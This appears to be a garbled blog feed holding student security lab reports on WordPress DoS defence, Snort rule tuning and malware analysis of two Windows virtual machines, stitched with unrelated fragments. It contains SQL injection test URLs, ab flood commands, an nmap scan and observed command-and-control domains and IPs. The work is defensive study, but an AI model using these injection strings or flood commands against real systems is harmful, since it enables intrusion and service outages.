contact me.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, I would like to thank the organizers for the invitation, as
well as, for a great organized event and kindly words from the trainees.
The group to the panel discussion was very enthusiasts, knowledgeable
and experience to share and to give an interesting ideas for the hence
actions.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The conclusion from the discussion was made. As well as, that this is
just a step to bring the topic into Macedonia, and for the organizations
and groups to become more familiar and aware about the Hate Speech on
Internet as extremely important topic to be taken into consideration. In
additions, to emphases that in Macedonia is widespread in different
categories.&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The objective of this laboratory test, scenario is to make explore
alternative “clever” solutions (as opposed to making the site more
resilient by optimizing it) to protect your site against attacks.
Moreover, DDoS [1] attacks, malicious code, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, we need to develop countermeasures for the &lt;strong&gt;working&lt;/strong&gt;
attacks …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;PURPOSE &amp;amp; SCENARIO&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The objective of this laboratory test, scenario is to make explore
alternative “clever” solutions (as opposed to making the site more
resilient by optimizing it) to protect your site against attacks.
Moreover, DDoS [1] attacks, malicious code, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, we need to develop countermeasures for the &lt;strong&gt;working&lt;/strong&gt;
attacks simulated with a standard DoS attack from a single IP address
(performed with AB [2] or Jmeter). Limitations for this scenarios is
highlighted:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;No additional hardware can be used&lt;/li&gt;
&lt;li&gt;The wordpress installation can not be optimized: no caching plugins,
    no reverse-proxy (varnish, squid etc)&lt;/li&gt;
&lt;li&gt;No reactive measures that automatically block incoming traffic: the
    site must respond to at least some of the requests coming from the
    attacker at all times&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The countermeasures must not have negative effects on “normal usage
    pattern”. Normal usage pattern is defined as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bursts of 10 connections per IP address in 1 second&lt;/li&gt;
&lt;li&gt;Page load times not over 10 seconds&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;
-   Normal usage must be possible from the same IP address that the
attack originated from after a 20 second delay maximum.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;In addition, we have to make much of the rules for the scenario. Rules
as follow: Fresh installation of the latest version of Ubuntu Server and
the most recent WordPress as of 20.10.2011. First priority: No normal
usage pattern connections can be dropped! Second priority: service speed
of normal connections. Defined by number of connections / second (easy
to measure). Third priority: How fast after the attack is stopped, the
site can be accessed from the attacking IP again.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Each test and measured results will be exposed in to Test section.
Whereas, the process of installation of clever solution and attacking
scripts will be provided in to Appendixes section.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally, the measurement results will be compared with the first state
without attack and any security solutions applied. Alternatively,
providing measurement results with one solution and attack will help us
to identify the most beneficial security solution. Therefore, in
Conclusion section comparison results will be highlighted.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;TESTS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Because of requirements of our scenario we need to display the results
before security solution is applied and attacker performance. For this
purpose we are going to use an AB script to display the response time of
the server:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ab -t 10 -n 10 -c 10 http://192.168.56.102/wordpress/&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The above script provides detail information, yet only important is
Request per second. Thus, with an fresh installation and without any
security solution, it provided with result of 3.95 [#/sec]. With other
word, 3.95 number of request per second. After applying different
security solution and performing an attack to the server, results will
be divers.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In addition, test were done by two different virtual environment
machines. One is for testing results and the other one is to perform
attack with the following script:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ab -n 100 -c 10 http://192.168.56.102/wordpress/&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;TEST 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;First test is to install libapache2-mod-evasive
[libapache2-mod-evasive]. Where, mod_evasive is an evasive maneuvers
module for Apache is to provide some protection in the event of an HTTP
DoS or DDoS attack or brute force attack. It is also designed to be a
detection tool, and can be easily configured to talk to ipchains,
firewalls, routers, and etcetera.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The process of installation and configuration refer to the Appendix 1.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;After completed the installation and configuration process it is time to
test the security solution and to highlight the results. Before
performing the attack the results were somehow, lower then, before
installing the mod-evasive, 2.06 number request per second. When we
start the attack and in same time analysis the server responded with
timeout. The conclusion is that mod-evasive it is not enough solution.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;TEST 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;From previous test we can see that the solution was not enough clever
for our needs. The server somehow was dead. However, we are going to
install now &lt;code&gt;mod_security&lt;/code&gt; module for apache, with side of previous
test. For more detail information of installation process and
configuration refer to Appendix 2 or to the following source
[mod_security].&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;CONCLUSION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;There are three points that we should consider and to see which proposal
was more accurate and it did the job that was required in the scenario.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In conclusion, the above proposals are nice and good example to have an
view of how and with what tools we should perform script kiddie
techniques. How to shutdown access to a server. On the whole, it show as
how to use tools and methods of measuring the bandwidth of network and
how to limit the transfer in comfortable way.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;APPENDIXES&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Appendix 1 is connected with the Method 1, which highlighted points are
illustration on what information we should check, to clarify that the
virtual environment has limitation of the network interface. Where
Appendix 2 is for installation process of Ubuntu Server 10.04 LTS and
wordpress, mysql installation.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;APPENDIX 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Installation process:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo apt-get install libapache2-mod-evasive&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Configuration process is followed and gather from the following source
[Evasive Module], for addition proposal please refer to[Blacklist]:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    sudo mkdir /var/log/apache2/mod_evasivesudo chown www-data /var/log/apache2/mod_evasive

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Afterwards, create its configuration file with a default content, with
the following command:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    sudo nano /etc/apache2/apache2.conf IfModule mod_evasive20.c;DOSHashTableSize 3097DOSPageCount 2DOSSiteCount 50DOSPageInterval 1DOSSiteInterval 1DOSBlockingPeriod 10DOSLogDir /var/log/apache2/mod_evasiveDOSEmailNotify root@localhostDOSWhitelist 127.0.0.1DOSSystemCommand &amp;amp;quot;/sbin/iptables -I INPUT -p tcp --dport 80 -s %s -j DROP/IfModule;

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;The above changes to take effect please restart the apache service by:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sudo service apache2 restart&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;You can test whether it works using a script included in the deb
package:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;perl /usr/share/doc/libapache2-mod-evasive/examples/test.pl&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;APPENDIX 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Installation and configuration of mod_security:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;apt-get install libapache2-modsecurity /etc/init.d/apache2 force-reload&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;

attacks against a wordpress site. In addition, we have to
develop/download/find/whatever a SNORT configuration (rulesets,

&lt;ul&gt;
&lt;li&gt;Less false positives&lt;/li&gt;
&lt;li&gt;Less false negatives&lt;/li&gt;
&lt;li&gt;The objectives are contradictory so the rule of thumb is one false
    negative per 10 false positives eg. solution with 10 false positives
    and 2 false negatives is better than the solution with 100 false
    positives and 1 false negatives, but the solution with 10 false
    positives and 1 false negative is better than the solution with 1
    false positive and 2 false negatives.&lt;/li&gt;
&lt;li&gt;Attack is defined by a single invocation of all the test scripts in
    a row.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Meanwhile, the new rules have to be able to detect not only the default
attacks that are set to a default snort configuration, yet they have to
be able to detect SQL injection, brute force password, apache killer
script, pytbull, etc. Furthermore, in figure 1 we are illustrating the
scenario.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 1: Illustration of Scenario&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, in the proposal section we will present two proposals that
have been submitted due to this laboratory test and additionally in
result section we will highlighted the identification numbers made by
snort set new rules. In section appendixes we will provide you with more
details configuration procedures, configuration of VM’s – Virtual
Machines, attacks, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally, closing with an conclusion and the results of best set of rules
made of the proposals.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;SETUP of SNORT&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;To setup snort in a right way, that will work for the second Host only
network please following the instruction link provided with a full
description and configuration of snort [SNORT2].&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;PROPOSALS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In total two proposals are presented in next sub-sections.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PROPOSAL 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Add &lt;a href="http://www.tud.ttu.ee/~t061780/attacks/robert.rules"&gt;http://www.tud.ttu.ee/~t061780/attacks/robert.rules&lt;/a&gt; to your Snort.
On your Snort machine:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    cd /etc/snort/ruleswget http://www.tud.ttu.ee/~t061780/attacks/robert.rules

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Now you have the rules, add them to your snort conf file (default
/etc/snort/snort.conf). To do that inser:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;include $RULE_PATH/robert.rules&lt;/code&gt; somewhere with rest of the rules after
line 800. Run Snort and test.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PROPOSAL 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Add the following rules: &lt;a href="http://predragtasevski.com/src/predrag.rules"&gt;http://predragtasevski.com/src/predrag.rules&lt;/a&gt;.
To be able to insert the snort rules in to the snort file please double
check where it is located. You can find the location with the following
command: find / -name snort.conf Before you continue please change the
IP address to your server address on line number #6, example alert tcp
any any -&gt; 192.168.56.X where x is your octet. Then to add the
following rules at the conf file do the following command:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;cat predrag.rules &amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;gt; snort.conf&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Now it is time to start or restart snort. It should work.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;RESULTS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;After executing the above proposal we will highlight the results into
the table bellow. Result are presented from the total amount of reports,
registered alerts in the snort. This is done by help of web interface of
Basic Analysis and Security Engine in addition Analysis Console for
Intrusion Databases (ACID) project tool [ACID]. Therefore, the result
from the proposals are highlighted below:&lt;/p&gt;
&lt;/p&gt;

&lt;/table&gt;

&lt;/p&gt;

different proposal rule sets. Details of the attacks conducted in the
table are presented in appendixes section.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Additionally, figure 2 is presenting the pine chart of the total number
alerts recognized by Snort.&lt;/p&gt;

&lt;p&gt;Secondly, figure 3 is representing the pine chart of total number of
unique alerts recognized by Snort.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 3: Total number of Unique Alerts&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;CONCLUSION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;From the above results we came to conclusion that the new applied rules
were successful and were able to recognize alerts more then the default
rule set of Snort. Meanwhile, only proposal 2 was able to recognized an
SQL injections without any additional tweaking. Although proposal 1 was
still useful, on the other hand the best solution is when we combine the
both rule sets proposals. Then the Snort is able to recognized an
significant number of total alerts and additionally for our laboratory
report more interesting is unique total number alerts.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Closing, even the default Snort rules configuration is good, yet when
you tweak it by&lt;/p&gt;
&lt;p&gt;your own needs, you will have much better IDS system for your network.
In future it should be recommended always refer to [snort_rules], to
gather more available advance Snort rules, made by experts. Where will
help you to configure and setup Snort IDS system to detecting attacks
against a wordpress site, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Here we test typical SQL- injection in URLs&lt;/p&gt;
&lt;p&gt;Commands used:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    wget "http://192.168.56.101/?p=1'%20OR%20'1'='1"wget "http://192.168.56.101/?p=1'%20AND%201=(SELECT%20COUNT(*)%20FROM%20tabname);%20—"

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Snort by default does not detect this, where in applying the proposal 2
rules, it did detect.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;APPENDIX 5&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;To test Snort and acidbase, perform a portscan of the Snort host.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sudo nmap -p1-65535 -sV -sS -O 192.168.56.102&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;APPENDIX 6&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;To setup pytbull it is a bit of pain, yet if you follow the rules and
the documentation it will work like shark. For documentation please

&lt;ul&gt;
&lt;li&gt;Find out what is infecting the machine win1&lt;/li&gt;
&lt;li&gt;Understand which way is the current malware dangerous to “your

&lt;li&gt;If possible, do clean win1&lt;/li&gt;
&lt;li&gt;Is win2 clean or it has problems, too?&lt;/li&gt;
&lt;li&gt;If needed, do clean win2&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Additionally, deliverable questions should be visible:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Summary – Your thoughts about the exercise. Please provide a short&lt;/li&gt;
&lt;li&gt;Malware that infects machines&lt;/li&gt;
&lt;li&gt;Md5 hash – if it possible and if not, please explain, why.&lt;/li&gt;

&lt;li&gt;A description – in which way that malware is a threat to “You
    organization”&lt;/li&gt;
&lt;li&gt;Tools You used to find the infection(s)&lt;/li&gt;
&lt;li&gt;Tools You used to clean machine(s)&lt;/li&gt;
&lt;li&gt;Where You found hints and how exactly You did it (you need to show
    Your thought and communication process – please write a summary of
    it.)&lt;/li&gt;
&lt;li&gt;How would you evaluate your partner.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, we have to consider the malware analysis report reminders,
please refer to [1] or [2].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Furthermore, each virtual machine will be analysed with different tools,
in case to gather more information and solution for disinfecting
process. Structure of the laboratory report is first to present each
virtual machine with details information in section Virtual Machine’s,
Each visualization is examined. Malware and disinfection process are
described. Meanwhile in appendices, we explain what virtual  environment
and tools we have used for this written report.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally the conclusion made of all analysis will be concise in summary
section.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;VIRTUAL MACHINE’s&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In this section each virtual machines are going to be examine in
sub-sections, analysis  and additionally the disinfection solutions,
etc. will be presented. The tools that are used for conducting the
analysis are presented in the Tools section.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;Win1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Intense detail information are highlighted bellow and MD5 sum for Win1
virtual box machine:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    OS: Ms Windows 7 ProfessionalVersion: 6.1.7601 Service Pack 1 Build 7601System type: 32 bitComputer name: DoeMUsers Names:- Jane Doe- Jhon DoeMD5 Sum: 6313cf7303de37ba62aadf5208b6ea78

&lt;/div&gt;

&lt;/p&gt;

&lt;h3&gt;Analysis&lt;/h3&gt;
&lt;/p&gt;

&lt;p&gt;The analysis starts firstly from the observations, then with an
supporting figures, sample of identification, are there any dependencies
and in closer with summary of the analysis. From analysis with a
different tools we came to conclusion that the above virtual image it is
infected with some malicious code. Were certain tools have provides as
an information that there is background accessing to network. However,
this analysis it is not enough so therefore we will do more inside
investigation to come-out with the hosts or network that the malicious
code is trying to access, or an information that is shared.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;To be able to identify the behaviour of a network we have used the
Wireshark tool. Bellow are highlighted the steps: Network adapter type:
NAT, logged in as: John Doe, additionally Wireshark run as
Administrator. Upon the testing, the only user application open on WIN1
is Notepad. No additional network activities from log-in user, also no
network activities from user on Host System. Wireshark, it detected
suspicious traffic:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Classification: BAD TCP (according to Wireshark coloring rules),
    Destination: 192.168.0.254 / 8.8.4.4 (Googne Public DNS) with
    Protocol: DNS; Info: Standard query A &lt;em&gt;mamtumbochka766.ru&lt;/em&gt; /
    Standard query A &lt;em&gt;followmego12.ru&lt;/em&gt; / Standart query A
    &lt;em&gt;losokorot7621.ru&lt;/em&gt; / standard query A &lt;em&gt;hidemyfass87111.ru&lt;/em&gt; /; Reason
    for classification as BAD TCP: Header checksum incorrect, maybe
    caused by “IP checksum offload”, Message: Bad Cheksum, Severity
    level: Error&lt;/li&gt;
&lt;li&gt;As a response, WIN1 machine got UDP packet (according to Wireshark
    coloring rules); Protocol: DNS; Info: Standard query response, Sever
    failure.&lt;/li&gt;
&lt;li&gt;Additionally, Wireshark detected another round of BAD TCP packets;
    Classification: BAD TCP; Destination: 195.226.218.135; Protocol:
    TCP; Port: 50530; Info: HTTP ACK (before that, WIN1 sent ACK
    message, got SYN ACK and this packet was an ACK). Where during HTTP
    session, WIN1 machine received the following linebased text data:
    &lt;em&gt;i5eOnJKV57mp5biuqK+0tri0tbW+uK+0qeDr57mp5b29uL6pr7ypurm5vqng6+e5qeU=&lt;/em&gt;;
    Then WIN1 received FIN ACK message from server and send ACK and FIN
    ACK. Session was finished.&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;The session was repeated once in 3 minutes and received line-based text
data, for all sessions was the same. For illustration please refer to
the following link for more details of pcap life of wireshark:

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Alternatively, we turn to Process Explorer and Process Monitor from
Sysinternals. In spite of comprehensive information and some suspicious
activities, these tools were unable to show direct link to malware. We
analyzed some suspicious DLLs and .exe files, but all of them appeared
to be legitimate Windows files. Also ee turned to Security Task Manager
by Neuber Software where it discovered file &lt;code&gt;061afffa0005f9e5.exe&lt;/code&gt; in
&lt;code&gt;C:\Users\JHONDO~1\LOCALS~1\Temp&lt;/code&gt; folder. Usually malware runs itself or
is hidden in Temp folder. So weird name and location give us enough
reason to think it’s malware. Additional information provided by
Security Task Manager: Company: Not provided; Type: Program. Hidden;
Starts: when Windows starts and Registry: win.ini.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Meanwhile, for advance analysis we have conduct with clean boot which is
explained into the KB article in the following
link:&lt;a href="http://support.microsoft.com/kb/929135"&gt;http://support.microsoft.com/kb/929135&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Now we run the wireshark analysis network tool, where no more suspicious
network traffic is identified. This means that the malicious code is
running from 3rd party applications and not from Microsoft services or
process.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Likelihood, to be able to identify the malicious code, threads in
virtual machine, we recommend to run an online free virus scanning. Thus
process is done by ESET free online tool scanning, refer to the
following link:
&lt;a href="/http://www.eset.com/us/online-scanner/"&gt;http://www.eset.com/us/online-scanner/&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The aim of this step is to help to identify if the threads have been
registered in to the virus signature database. If so, this will be a
useful information and will assist to continue with analysis.&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;From the above table we can come to the conclusive proof that total sum
number of malicious code running in the virtual machine are 20, with an
9 different definitions of trojan, warms, etc. However, most of them
were located in to the Recycle bin folder. Additionally to the analysing
packets with Wireshark showed that Win1 has some malware, which sent and
received some information over network without knowledge of the
user. Destination IP addresses, names and port numbers were suspicious.&lt;/p&gt;
&lt;/p&gt;

&lt;h3&gt;Disinfection&lt;/h3&gt;
&lt;/p&gt;

&lt;p&gt;Indeed, this virtual machine it is infected. Therefore we have to
perform an disinfection process. However, from the above table of the
links it provides an solution and steps that should be followed for
disinfection process. Either with an tool or steps for removing the
malicious code. Also, we can remove the files with some additional tools
that are available for free, for instance Eraser tool. Now that we know
the exact location of each infected file it is much easier and simple to
be able to delete, remove the files from our system. Although we could
use the Eset scanner tool that we have performed previously.
Nevertheless, to be sure and more save way is to do the removing process
manually.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, recommendation for deleting the malicious code of all time
from virtual machine is eraser tool. You need to configure task and
which folders or files you specify to be removed. After the task was
completed, restart the machine and now the system should be disinfected
and additional we recommend to run the Eset online scanner free tool
one more time, just in case in a meaner of your organization.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;Win2&lt;/h2&gt;

&lt;/div&gt;

&lt;/p&gt;

&lt;h3&gt;Analysis&lt;/h3&gt;
&lt;/p&gt;

&lt;p&gt;Despite the fact that Process Monitor, TCPView and other Sysinternals
Suite analysis tools did not help us at all (also Wireshark did not
detect any suspicious network activities), at this point, additionally
registry changes were detected with CaptureBat tool, where the log file
will be presented in figure 2. However by running the ESET online free
scanner tool, it did detect in total three threads to our virtual
machine, logs are presented bellow.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Eset Online Scanner, found 3 threads:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    C:\$Recycle.Bin\S-1-5-21-1301155936-2652204530-896827088-1001\$RKV8ZW1.exe Win32/Duqu.A trojanC:\Users\Jane\AppData\Local\Temp\0004fbd1.tmpa variant of Win32/Kryptik.VFI trojanC:\Users\Jane\AppData\Local\Temp\b01dffe3001c4fe2.exe Win32/TrojanDownloader.Agent.QXN trojan

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Threads are located in to the system directory of Jane user name.
Additionally, there is an other malicious code located into the Recycle
bin as we were able to detect into the previous analysis for Win1
virtual machine. In spite of fact that in previously scenario we had
only a threads located into Recycle Bin, at this virtual environment we
have as an local files. Therefore to be able to identify the above file
and there integrity we have to sum the MD5 and SHA256 algorithms. For
this action we are using an online tool winMd5Sum.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;For advance analysis, we will run the MD5Sum into the
&lt;a href="http://virustotal.com/"&gt;virustotal.com&lt;/a&gt; search to identify the threads.
Indeed, all of the above have been reported previously as a malware.
Meanwhile, to gather better description of the above malicious codes we
will search the definitions in the Eset database and descriptions
provided in the following table.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 2: CaptureBAT, win2, registry changes&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Figure 2 is just a part of the log files that were able to be capture of
the CaptureBAT tool, as we can see form the above that many changes were
effected over the registries. Therefore, we need to run either an
registry system check or as we know the location of the malicious code,
with OllyDbg we can run the files and inspect there behaviour and if
they have any additionally affect over the memory dump, etc. presented
in figure 3.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 3: OllyDbg analysis, memory dump, system dll access, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Nevertheless, because now we have the locations and the threads
description it is next step to disinfected the system, yet it is still a
big thread for the organization, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;h3&gt;Disinfection&lt;/h3&gt;
&lt;/p&gt;

&lt;p&gt;As on the previously scenario, we recommend either to use the Eset
online free scanner or to use in more convinced way the Eraser tool, for
removing the malicious code from the machine forever. Furthermore, to
just make sure that the above malicious code is removed, disinfected
from our system still recommendations is to run the Eset tool for a
second time, for double check the system.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;All the above files and threads could be a very harmful for the
organization and for everyday production work. Therefore, advance
analysis of the system it is always in hands to help us to protect our
data, internet access, etc. of being leaked.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;Tools&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Tools that help for conducting the results are highlighted in this

&lt;p&gt;However, there are many other tools that can be used. Recent papers,

&lt;/p&gt;

&lt;h1&gt;SUMMARY&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Nowadays malicious codes, infection of the system is one of the highest
vector of production work everyday of the organizations. Therefore,
different approaches, advance analysis, troubleshooting, etc. has to be
applicable and stated in every organization.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Leaking of data, information, access of network (internal and external)
can be very harmful for organization and even the home usage of
computers. Therefore, this laboratory report main aim is to provide the
reader to be able to conduct advance analysis of system and their
disinfection.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;From the two scenarios, virtual machine environments we came to final
consistent conclusion that both of them are infected. Yet different
threads were able to be found in the systems. However analysis is done
by the short time of period. In each scenario in report provides an
solutions how and what kind of actions should be considered for
future disinfection of the system. Moreover, in next lines we are
stating the summary of each infected machine.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Firstly, Win1 was infected with identified 20 threads, with other words
in total of 9 different definitions of trojan, malware, warms code. The
definition of the threads were advance, where from the links provided in
the table above, is stated that the few of them were playing very smart.
By smart, we mean, that if they have noticed that wireshark, tcpviewer
or other tools were running, the malicious code stops responding, so it
was able to cover his identity, information leaks, etc. In addition, the
malicious codes were located in to the Recycle bin folder, where we were
not able to identify there MD5 sum or SHA256. If we want it to proceed
in this step, we had to restore them from the bin folder and then
identify them. Advance we identify the user that has spread the
malicious code, user name: John Doe. Nevertheless, disinfecting process
helped us to remove the code from the system and just in case we have
run in second time the Eset online scanner tool.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Secondly, Win2 was indeed infected too. In spite of the scenario one,
this was less infected. The total sum of the threads were 3. Each of
them were supply by the administrator user account: Jane Doe. The
location of the malicious code is located into the temp folders and one
in a recycle bin directory. From the definitions links from the above
table we can stated that they have try to attempt over the network to
leak informations, registry changes and additional files are added to
the system. However, all of them were harmful for our environment and
therefore and disinfection steps were necessary. Additionally, the
location of the files were accessible therefore we provide an addition
MD5sum and SHA256 for each file, were it help us to identify them in
&lt;a href="http://virustotal.com/"&gt;virustotal.com&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally, the both virtual box were infected with different malicious
code. Advance disinfection procedures were necessary to troubleshoot and
find the solution to make the hence system for being able to use it in
production. However, the threads were able to share, leak information
and data, in advance were able to change the registry and even the
system files. Therefore, we do recommend advance furthermore actions to
be considered. Meanwhile, the list of the tools that is provided by this
report will help the hence users and analysers to be able to identify
the threads in a system and to perform an disinfection. Additional the
tutorials, stepwise solutions were provided as a reference where can
guide for more advance troubleshooting.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Closing, as there are many different ways, tools, process for analysing
the malicious code behaviours in system this laboratory report is
supplying the reader with advance and stepwise solution for identifying
the infection of the system. The above procedure can be applied into
real time, everyday working machine.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;WORKLOAD&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;We analysed both Win1 and Win2 on our computers. Virtualization
environment for both host systems were the same. Each of us analyzed
Win1 and Win2. First we analyzed Win1 and then Win2. So the group
analyzed each of Virtual Machines (Win1 and Win2) two times.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In such way we cross-referenced the analysis results and got more
reliable information about the system and its infection.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;APPENDIXES&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Appendix 1 is configuration of the virtual environment.&lt;/p&gt;
&lt;/p&gt;

&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;Each topic will be divided into own section, where at the end of each
topic we stated the reference and additional reading material. The
source code, scrips and the additional task were given by the lecture.
However this will help the readers and people interesting into
programing for further work and involvement with the above topics.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;1. Session storage’s in Ruby on Rail&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Session in Rails is a hash-like structure which allows you to store data
across requests. Sessions can hold any kind of data object (with some
limitations) because they store data using Data Marshalling.Session in
rails it is not a hash. Session creates new instant of session in every
time new user visit the site. Recommendation is to not store large
objects in a session and critical data should not be stored in
session.Rails way of&lt;/p&gt;
&lt;p&gt;implementing session is:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;session_id is a 32 hex character MD5 hash based upon time, random
    number and constant string. It is stored in cookie at client
    browser. Rails provides transparent support for session_id.&lt;/li&gt;
&lt;li&gt;Session storage discussed below.&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

